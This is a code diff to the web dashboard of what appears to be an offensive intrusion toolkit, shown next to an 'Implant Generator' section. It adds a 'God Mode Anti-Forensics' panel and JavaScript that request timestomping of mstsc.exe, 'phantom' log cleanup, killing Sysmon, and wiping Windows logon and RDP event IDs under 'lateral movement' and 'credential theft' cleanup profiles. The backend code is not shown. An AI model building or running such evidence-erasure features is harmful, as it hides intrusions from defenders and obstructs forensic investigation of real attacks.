@@ -248,6 +248,57 @@
             </div>
         </div>
 
+        <!-- God Mode Anti-Forensics -->
+        <div class="bg-gradient-to-r from-purple-900/30 via-pink-900/20 to-red-900/30 rounded-xl p-6 mt-6 border border-purple-500/30">
+            <div class="flex items-center justify-between mb-4">
+                <h2 class="text-xl font-bold text-purple-400">
+                    <i class="fas fa-skull mr-2"></i>God Mode Anti-Forensics
+                </h2>
+                <label class="flex items-center cursor-pointer">
+                    <span class="text-sm text-gray-400 mr-2">Enable</span>
+                    <input type="checkbox" id="godModeEnabled" class="w-5 h-5 accent-purple-500">
+                    <span class="ml-2 text-2xl">💀</span>
+                </label>
+            </div>
+            
+            <div id="godModeOptions" class="hidden">
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-3 mb-4">
+                    <label class="flex items-center bg-gray-800 p-3 rounded-lg cursor-pointer hover:bg-gray-700 transition">
+                        <input type="checkbox" id="gmTimestomp" checked class="mr-2 accent-purple-500">
+                        <span class="text-sm"><i class="fas fa-clock text-yellow-400 mr-1"></i>Time Stomp</span>
+                    </label>
+                    <label class="flex items-center bg-gray-800 p-3 rounded-lg cursor-pointer hover:bg-gray-700 transition">
+                        <input type="checkbox" id="gmPhantomClean" checked class="mr-2 accent-purple-500">
+                        <span class="text-sm"><i class="fas fa-ghost text-cyan-400 mr-1"></i>Phantom Clean</span>
+                    </label>
+                    <label class="flex items-center bg-gray-800 p-3 rounded-lg cursor-pointer hover:bg-gray-700 transition">
+                        <input type="checkbox" id="gmSysmonKill" class="mr-2 accent-purple-500">
+                        <span class="text-sm"><i class="fas fa-skull-crossbones text-red-400 mr-1"></i>Sysmon Kill</span>
+                    </label>
+                    <label class="flex items-center bg-gray-800 p-3 rounded-lg cursor-pointer hover:bg-gray-700 transition">
+                        <input type="checkbox" id="gmRdpLogs" checked class="mr-2 accent-purple-500">
+                        <span class="text-sm"><i class="fas fa-desktop text-purple-400 mr-1"></i>RDP Logs</span>
+                    </label>
+                </div>
+                
+                <div class="flex items-center space-x-4">
+                    <select id="gmCleanupProfile" class="flex-1 bg-gray-800 border border-gray-600 rounded-lg px-4 py-2">
+                        <option value="lateral_movement">🔄 Lateral Movement Cleanup</option>
+                        <option value="credential_theft">🔑 Credential Theft Cleanup</option>
+                        <option value="full_cleanup" selected>💀 Full Cleanup</option>
+                    </select>
+                    <button onclick="executeGodModeCleanup()" 
+                            class="bg-gradient-to-r from-purple-600 to-red-600 hover:from-purple-500 hover:to-red-500 px-6 py-2 rounded-lg font-bold transition">
+                        <i class="fas fa-radiation mr-2"></i>Execute
+                    </button>
+                </div>
+                <p class="text-xs text-gray-500 mt-2">
+                    <i class="fas fa-info-circle mr-1"></i>
+                    Cleans Event IDs: 4624, 4648, 4778, 4779 (RDP logon/disconnect), Security logs
+                </p>
+            </div>
+        </div>
+
         <!-- Implant Generator -->
         <div class="bg-gray-800 rounded-xl p-6 mt-6 border border-gray-700">
             <h2 class="text-xl font-bold mb-4 text-green-400">
@@ -505,6 +556,55 @@
             code.select();
             document.execCommand('copy');
             alert('Copied to clipboard!');
+        }
+
+        // God Mode Anti-Forensics
+        document.getElementById('godModeEnabled')?.addEventListener('change', function() {
+            document.getElementById('godModeOptions').classList.toggle('hidden', !this.checked);
+        });
+
+        async function executeGodModeCleanup() {
+            const timestomp = document.getElementById('gmTimestomp').checked;
+            const phantom = document.getElementById('gmPhantomClean').checked;
+            const sysmonKill = document.getElementById('gmSysmonKill').checked;
+            const rdpLogs = document.getElementById('gmRdpLogs').checked;
+            const profile = document.getElementById('gmCleanupProfile').value;
+
+            try {
+                const results = [];
+                
+                if (timestomp) {
+                    const response = await fetch('/god-mode/api/timestomp/generate', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            target_path: 'mstsc.exe',
+                            reference_file: 'C:\\Windows\\System32\\notepad.exe',
+                            include_fn: true
+                        })
+                    });
+                    results.push(await response.json());
+                }
+
+                if (phantom) {
+                    const response = await fetch('/god-mode/api/phantom/generate', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            cleanup_profile: profile,
+                            use_phantom: true,
+                            kill_sysmon: sysmonKill,
+                            event_ids: rdpLogs ? [4624, 4648, 4778, 4779, 4672] : []
+                        })
+                    });
+                    results.push(await response.json());
+                }
+
+                alert(`God Mode executed! ${results.filter(r => r.success).length}/${results.length} operations ready`);
+            } catch (error) {
+                console.error('God Mode error:', error);
+                alert('God Mode error: ' + error.message);
+            }
         }
     </script>
 </body>
